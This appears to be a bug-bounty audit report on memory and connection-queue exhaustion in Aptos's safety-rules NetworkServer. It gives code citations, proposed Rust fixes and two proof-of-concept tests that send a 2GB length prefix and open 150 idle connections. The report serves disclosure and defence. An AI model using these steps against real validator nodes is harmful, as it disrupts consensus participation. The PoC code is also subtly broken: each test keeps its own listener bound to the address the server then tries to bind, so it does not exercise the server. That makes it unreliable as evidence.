# Audit Report

## Title
Safety-Rules Remote Service Vulnerable to Memory Exhaustion and Connection Queue Exhaustion

## Summary
The `NetworkServer` used by the safety-rules remote service lacks critical protections against resource exhaustion attacks. An attacker with network access to the service can cause it to crash by either sending messages with unbounded sizes to exhaust memory, or by opening multiple connections to exhaust the connection accept queue, preventing legitimate clients from connecting.

## Finding Description

The safety-rules remote service creates a `NetworkServer` that processes consensus-critical operations. [1](#0-0) 

This `NetworkServer` implementation has two critical vulnerabilities:

**Vulnerability 1: Unbounded Message Size Leading to Memory Exhaustion**

The `NetworkStream` reads messages with a 4-byte length prefix (u32) but performs no validation on the maximum allowed message size. [2](#0-1) 

The read loop continuously appends data to an internal buffer without any size limits. [3](#0-2) 

An attacker can:
1. Connect to the safety-rules service
2. Send a 4-byte length prefix indicating a massive size (up to 0xFFFFFFFF = ~4GB)
3. Slowly send data, forcing the server to accumulate memory until it crashes with OOM

**Vulnerability 2: Single-Threaded Blocking Server Allows Connection Queue Exhaustion**

The `NetworkServer` only handles one connection at a time in a blocking manner. [4](#0-3) 

The server only accepts a new connection when no active stream exists. [5](#0-4) 

While the server blocks processing one connection (which times out after 30 seconds by default), incoming connections pile up in the TCP listener's accept queue (system default ~128 connections). [6](#0-5) 

An attacker can:
1. Open a connection and send nothing (or send data very slowly)
2. Force the server to block for the timeout duration (30 seconds default) [7](#0-6) 
3. During this period, open hundreds of additional connections to fill the accept queue
4. Once the queue is full, legitimate connections are refused

The safety-rules service runs in an infinite loop processing one message at a time. [8](#0-7) 

## Impact Explanation

This vulnerability is assessed as **HIGH severity** per the Aptos bug bounty program criteria for "Validator node slowdowns" and "API crashes."

The safety-rules service is a critical consensus component that:
- Enforces voting rules to prevent equivocation
- Signs blocks and votes
- Maintains consensus safety guarantees

If an attacker crashes this service through memory exhaustion or prevents legitimate consensus components from connecting through connection exhaustion, the validator node:
- Cannot participate in consensus (loss of liveness)
- Cannot sign blocks or votes
- May cause the validator to miss proposals and lose rewards

While the config sanitizer enforces that mainnet validators use `SafetyRulesService::Local` mode, [9](#0-8)  this vulnerability still affects:
- Testnet and devnet validators running in Process mode
- Development and testing environments
- Any misconfigured production deployments

## Likelihood Explanation

The likelihood depends on network exposure:

**High likelihood if:**
- The safety-rules service is misconfigured to bind to a non-localhost address (e.g., `0.0.0.0` or public IP)
- Running in testnet/devnet with default configurations that may expose the service

**Lower likelihood if:**
- Service is correctly bound to `127.0.0.1` (localhost only) as shown in example configs [10](#0-9) 
- However, even localhost binding is vulnerable to attacks from compromised processes on the same machine

The exploit complexity is LOW - any attacker with network access can trivially exploit this by:
- Sending oversized length prefixes (4 bytes)
- Opening multiple TCP connections

## Recommendation

**Fix 1: Implement Maximum Message Size Limit**

Add a maximum message size constant and validate it before reading:

```rust
// In secure/net/src/lib.rs
const MAX_MESSAGE_SIZE: usize = 10 * 1024 * 1024; // 10 MB

fn read_buffer(&mut self) -> Result<Vec<u8>, Error> {
    if self.buffer.len() < 4 {
        return Ok(Vec::new());
    }

    let mut u32_bytes = [0; 4];
    u32_bytes.copy_from_slice(&self.buffer[..4]);
    let data_size = u32::from_le_bytes(u32_bytes) as usize;
    
    // ADD THIS CHECK
    if data_size > MAX_MESSAGE_SIZE {
        return Err(Error::DataTooLarge(data_size));
    }

    let remaining_data = &self.buffer[4..];
    if remaining_data.len() < data_size {
        return Ok(Vec::new());
    }

    let returnable_data = remaining_data[..data_size].to_vec();
    self.buffer = remaining_data[data_size..].to_vec();
    Ok(returnable_data)
}
```

Also add a check in the `read()` method to prevent the buffer from growing beyond the maximum:

```rust
pub fn read(&mut self) -> Result<Vec<u8>, Error> {
    let result = self.read_buffer()?;
    if !result.is_empty() {
        return Ok(result);
    }

    loop {
        // ADD THIS CHECK
        if self.buffer.len() > MAX_MESSAGE_SIZE {
            return Err(Error::DataTooLarge(self.buffer.len()));
        }
        
        trace!("Attempting to read from stream");
        let read = self.stream.read(&mut self.temp_buffer)?;
        // ... rest of the method
    }
}
```

**Fix 2: Add Connection Rate Limiting and/or Multi-threaded Connection Handling**

Either:
- Implement connection rate limiting to prevent rapid connection attempts
- Use a thread pool or async runtime (tokio) to handle multiple connections concurrently
- Set an explicit backlog limit with `TcpListener::bind()` and then configure the socket with a smaller backlog

**Fix 3: Add Authentication/Authorization**

Implement mutual TLS or another authentication mechanism to prevent unauthorized connections to the safety-rules service.

## Proof of Concept

```rust
// PoC demonstrating memory exhaustion vulnerability
#[test]
fn test_memory_exhaustion_attack() {
    use std::io::Write;
    use std::net::{TcpStream, SocketAddr};
    use std::time::Duration;
    
    // Start a NetworkServer in a separate thread
    let addr: SocketAddr = "127.0.0.1:0".parse().unwrap();
    let listener = std::net::TcpListener::bind(addr).unwrap();
    let server_addr = listener.local_addr().unwrap();
    
    std::thread::spawn(move || {
        let mut server = NetworkServer::new("test".to_string(), server_addr, 5000);
        loop {
            // This will block trying to read a huge message
            let _ = server.read();
        }
    });
    
    std::thread::sleep(Duration::from_millis(100));
    
    // Attacker connects and sends a malicious length prefix
    let mut stream = TcpStream::connect(server_addr).unwrap();
    
    // Send length prefix indicating 2GB message
    let huge_size: u32 = 0x7FFFFFFF; // 2GB - 1
    stream.write_all(&huge_size.to_le_bytes()).unwrap();
    
    // Send some data slowly - server will keep accumulating in buffer
    let chunk = vec![0u8; 1024];
    for _ in 0..1000 {
        stream.write_all(&chunk).unwrap();
        std::thread::sleep(Duration::from_millis(10));
    }
    
    // Server is now holding 1MB in buffer and waiting for 2GB - 1MB more
    // This would eventually cause OOM if we kept sending
}

// PoC demonstrating connection exhaustion
#[test]
fn test_connection_exhaustion_attack() {
    use std::net::{TcpStream, SocketAddr};
    use std::time::Duration;
    
    let addr: SocketAddr = "127.0.0.1:0".parse().unwrap();
    let listener = std::net::TcpListener::bind(addr).unwrap();
    let server_addr = listener.local_addr().unwrap();
    
    std::thread::spawn(move || {
        let mut server = NetworkServer::new("test".to_string(), server_addr, 5000);
        loop {
            let _ = server.read(); // Blocks on each connection
        }
    });
    
    std::thread::sleep(Duration::from_millis(100));
    
    // Attacker opens many connections without sending data
    let mut connections = Vec::new();
    for _ in 0..150 {
        if let Ok(stream) = TcpStream::connect(server_addr) {
            connections.push(stream);
        }
        std::thread::sleep(Duration::from_millis(10));
    }
    
    // Try to connect as a legitimate client - should fail after queue fills
    let legitimate_connection = TcpStream::connect_timeout(
        &server_addr, 
        Duration::from_secs(1)
    );
    
    // This may fail with connection refused if accept queue is full
    assert!(legitimate_connection.is_err() || connections.len() < 150);
}
```

## Notes

- This vulnerability exists in production code but is mitigated in mainnet deployments by the config sanitizer that enforces `SafetyRulesService::Local` mode
- Testnet, devnet, and development environments using Process mode remain vulnerable
- The default configuration binds to localhost (127.0.0.1), but misconfigurations could expose the service to remote attackers
- Even with localhost binding, a compromised process on the validator machine could exploit this vulnerability
- The vulnerability breaks the "Resource Limits" invariant that all operations should respect memory and computational constraints

### Citations

**File:** consensus/safety-rules/src/remote_service.rs (L37-38)
```rust
    let mut network_server =
        NetworkServer::new("safety-rules".to_string(), listen_addr, network_timeout_ms);
```

**File:** consensus/safety-rules/src/remote_service.rs (L40-44)
```rust
    loop {
        if let Err(e) = process_one_message(&mut network_server, &mut serializer_service) {
            warn!("Failed to process message: {}", e);
        }
    }
```

**File:** secure/net/src/lib.rs (L282-282)
```rust
        let listener = TcpListener::bind(listen);
```

**File:** secure/net/src/lib.rs (L365-366)
```rust
    fn client(&mut self) -> Result<&mut NetworkStream, Error> {
        if self.stream.is_none() {
```

**File:** secure/net/src/lib.rs (L376-376)
```rust
            let (stream, stream_addr) = match listener.accept() {
```

**File:** secure/net/src/lib.rs (L436-443)
```rust
        loop {
            trace!("Attempting to read from stream");
            let read = self.stream.read(&mut self.temp_buffer)?;
            trace!("Read {} bytes from stream", read);
            if read == 0 {
                return Err(Error::RemoteStreamClosed);
            }
            self.buffer.extend(self.temp_buffer[..read].to_vec());
```

**File:** secure/net/src/lib.rs (L484-486)
```rust
        let mut u32_bytes = [0; 4];
        u32_bytes.copy_from_slice(&self.buffer[..4]);
        let data_size = u32::from_le_bytes(u32_bytes) as usize;
```

**File:** config/src/config/safety_rules_config.rs (L44-44)
```rust
            network_timeout_ms: 30_000,
```

**File:** config/src/config/safety_rules_config.rs (L99-104)
```rust
            if chain_id.is_mainnet() && !safety_rules_config.service.is_local() {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    format!("The safety rules service should be set to local in mainnet for optimal performance! Given config: {:?}", &safety_rules_config.service)
                ));
            }
```

**File:** config/src/config/test_data/validator.yaml (L14-16)
```yaml
        service:
            type: process
            server_address: "/ip4/127.0.0.1/tcp/5555"
```
